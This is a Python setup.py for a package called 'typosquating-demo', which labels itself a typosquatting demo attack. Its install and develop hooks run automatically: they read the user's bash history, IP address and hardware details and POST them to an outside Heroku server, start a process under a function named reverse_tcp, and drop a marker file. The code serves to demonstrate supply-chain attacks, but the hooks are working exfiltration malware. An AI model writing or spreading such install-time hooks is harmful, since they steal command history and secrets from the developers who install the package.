#!/usr/bin/env python

from __future__ import print_function

import getpass
import os
import time
import datetime
import ctypes
import sys
import platform
import subprocess
import requests
import socket

from setuptools import setup
from setuptools.command.develop import develop
from setuptools.command.install import install

long_description_filename = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), 'README.md')

with open(long_description_filename) as fd:
    long_description = fd.read()

FILENAME = 'typosquating-demo'
ROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)
USER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)
USER = getpass.getuser()
TIME = str(datetime.datetime.now())

def get_ip_adress():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP


def get_command_history():
    cmd = 'cat {}/.bash_history'    
    return os.popen(cmd.format(os.path.expanduser('~'))).read()


def get_hardware_info():
  if sys.platform.startswith('linux'):
    try:
      hw_info = subprocess.check_output('lshw -short',
                  stderr=DEVNULL, shell=True)
    except:
      hw_info = ''
    if not hw_info:
      try:
        hw_info = subprocess.check_output('lspci',
                  stderr=DEVNULL, shell=True)
      except:
        hw_info = ''
      hw_info += '\n' +\
        os.popen('free -m').read().strip()
    return hw_info


def get_info(url):
  ip_adress = '\nIP Adress\n\n' + get_ip_adress()
  bash_history = '\nBash History\n\n' + get_command_history()
  hardware_info = 'Hardware Info\n' + get_hardware_info()
  infos = {
    'ip_adress': ip_adress,
    'bash_history': bash_history,
    'hardware_info': hardware_info
  }
  res = requests.post(url, json=infos)


def touch_file():
    try:
        with open(ROOT_PATH, 'a') as root_fd:
            message = 'Created {!r} with user {!r} at {!r}'.format(
                ROOT_PATH,
                USER,
                TIME
            )
            print(message)
            root_fd.write(message + '\n')
    except (IOError, OSError):
        try:
            with open(USER_PATH, 'a') as user_fd:
                message = 'Created {!r} with user {!r} at {!r}'.format(
                    USER_PATH,
                    USER,
                    TIME
                )
                print(message)
                user_fd.write(message + '\n')
        except (IOError, OSError):
            print('Could not write to {!r} or {!r}'.format(ROOT_PATH, USER_PATH))
            print('What kind of tricky system are you running this on?')


def reverse_tcp():
    import subprocess, sys
    p = subprocess.Popen([sys.executable, 'script.py'],
                     stdout=subprocess.PIPE,
                     stderr=subprocess.STDOUT)

class PostDevelopCommand(develop):
    def run(self):
        reverse_tcp()
        touch_file()
        get_info(URL)
        develop.run(self)


class PostInstallCommand(install):
    def run(self):
        reverse_tcp()
        touch_file()
        get_info(URL)
        install.run(self)
        reverse_tcp()

URL = 'https://typosquating-server.herokuapp.com/'

setup(
    name='typosquating-demo',
    version='1.1.7',
    description='Typosquating demo attack.',
    long_description=long_description,
    long_description_content_type='text/markdown',
    url='https://github.com/amboulouma/typosquating-demo',
    packages=[],
    license='GPLv3',
    classifiers=[
        'Environment :: Console',
        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',
        'Operating System :: MacOS :: MacOS X',
        'Operating System :: Microsoft :: Windows',
        'Operating System :: POSIX',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Topic :: Security',
    ],
    install_requires=[],
    tests_require=[],
    cmdclass={
        'develop': PostDevelopCommand,
        'install': PostInstallCommand,
    },
    include_package_data=True,
)
